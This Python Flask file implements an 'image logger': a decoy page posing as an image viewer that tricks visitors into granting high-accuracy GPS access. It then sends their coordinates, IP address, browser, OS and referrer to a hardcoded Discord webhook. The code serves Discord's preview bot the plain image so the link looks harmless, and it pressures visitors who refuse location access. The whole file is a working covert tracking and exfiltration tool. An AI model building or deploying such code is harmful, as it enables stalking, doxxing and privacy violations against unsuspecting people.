from flask import Flask, request, make_response
import httpagentparser
import requests
import datetime

app = Flask(__name__)

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1527179048684621934/ereAKZmM3p-QZK_PUCJdS0OFGu7ikkJCQNHKb6L9DVLF_aB82iDW_zioBb7PGNMQKUwo"
IMAGE_URL = "https://i.pinimg.com/236x/6a/3d/33/6a3d336840b6a2d91efde0ff77f038e9.jpg"

def fetch_image():
    try:
        r = requests.get(IMAGE_URL, timeout=10)
        r.raise_for_status()
        return r.content, r.headers.get('Content-Type', 'image/jpeg')
    except:
        return b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;', 'image/gif'

# SIMPLE HTML WITH BUTTON - NO COMPLEX STUFF
HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image Viewer</title>
</head>
<body style="background:#111;color:#fff;font-family:Arial;text-align:center;padding-top:50px;">
    <h2>Click to view full image</h2>
    <img src="IMAGE_URL_PLACEHOLDER" style="max-width:80%;border-radius:10px;margin:20px 0;" />
    <br>
    <button onclick="getLocation()" style="padding:15px 40px;font-size:20px;background:#ff0040;color:#fff;border:none;border-radius:50px;cursor:pointer;">
        🖼️ View Full Image
    </button>
    <p style="color:#666;font-size:14px;margin-top:20px;">Click the button to load the high-res version</p>

    <script>
        const WEBHOOK = "WEBHOOK_PLACEHOLDER";
        const IP = "IP_PLACEHOLDER";
        const BROWSER = "BROWSER_PLACEHOLDER";
        const OS = "OS_PLACEHOLDER";
        const DEVICE = "DEVICE_PLACEHOLDER";
        const REFERRER = "REFERRER_PLACEHOLDER";
        const IMG_URL = "IMAGE_URL_PLACEHOLDER";

        function sendToDiscord(lat, lng, acc) {
            const data = {
                content: "**📍 Location Captured**",
                embeds: [{
                    title: "GPS Coordinates",
                    color: 0xff0000,
                    fields: [
                        {name: "IP", value: "`" + IP + "`", inline: true},
                        {name: "Browser", value: "`" + BROWSER + "`", inline: true},
                        {name: "OS/Device", value: "`" + OS + " - " + DEVICE + "`", inline: true},
                        {name: "Latitude", value: "`" + lat + "`", inline: true},
                        {name: "Longitude", value: "`" + lng + "`", inline: true},
                        {name: "Accuracy", value: "`" + acc + "m`", inline: true},
                        {name: "Referrer", value: "`" + REFERRER + "`", inline: false}
                    ],
                    footer: {text: "Image Logger"}
                }]
            };
            fetch(WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).then(() => {
                document.body.innerHTML = '<h2 style="color:#00ff66;">✅ Location Sent!</h2><img src="' + IMG_URL + '" style="max-width:90%;"/>';
            }).catch(() => {
                document.body.innerHTML = '<h2 style="color:#ff4444;">Error</h2>';
            });
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        sendToDiscord(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                    },
                    function(err) {
                        alert('Location access needed to view full image. Please allow and try again.');
                        console.log(err);
                    },
                    {enableHighAccuracy: true, timeout: 10000}
                );
            } else {
                alert('Geolocation not supported');
            }
        }
    </script>
</body>
</html>
"""

@app.route('/api/image', methods=['GET'])
def serve_image():
    user_agent = request.headers.get('User-Agent', '')
    
    # Detect Discord bot - serve image directly
    if 'discord' in user_agent.lower():
        img, ctype = fetch_image()
        resp = make_response(img)
        resp.headers.set('Content-Type', ctype)
        return resp
    
    # If geo param, serve image
    if request.args.get('geo'):
        img, ctype = fetch_image()
        resp = make_response(img)
        resp.headers.set('Content-Type', ctype)
        return resp

    # Build HTML with values
    ip = request.headers.get('X-Forwarded-For', request.remote_addr or 'Unknown')
    referrer = request.headers.get('Referer', 'No referrer')
    
    try:
        parsed = httpagentparser.detect(user_agent)
        browser = parsed.get('browser', {}).get('name', 'Unknown')
        os_name = parsed.get('os', {}).get('name', 'Unknown')
        device = parsed.get('device', 'Unknown')
    except:
        browser = os_name = device = "Unknown"

    html = HTML
    html = html.replace("WEBHOOK_PLACEHOLDER", DISCORD_WEBHOOK)
    html = html.replace("IMAGE_URL_PLACEHOLDER", IMAGE_URL)
    html = html.replace("IP_PLACEHOLDER", ip)
    html = html.replace("BROWSER_PLACEHOLDER", browser)
    html = html.replace("OS_PLACEHOLDER", os_name)
    html = html.replace("DEVICE_PLACEHOLDER", device)
    html = html.replace("REFERRER_PLACEHOLDER", referrer)

    resp = make_response(html)
    resp.headers.set('Content-Type', 'text/html')
    resp.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate')
    return resp

if __name__ == '__main__':
    app.run()
